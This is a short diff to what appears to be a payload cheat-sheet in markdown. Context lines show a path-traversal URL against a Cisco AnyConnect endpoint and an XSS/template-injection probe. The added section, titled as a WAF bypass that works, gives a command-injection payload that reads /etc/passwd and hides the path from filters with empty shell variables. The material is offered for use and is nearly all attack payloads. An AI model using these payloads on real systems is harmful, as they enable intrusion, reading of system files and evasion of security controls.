@@ -14,3 +14,8 @@ https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&r
 ```
 '"><svg/onload=prompt(5);>{{1234*6543}}
 ```
+### Here's a command injection WAF bypass that works:
+
+```
+cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+```
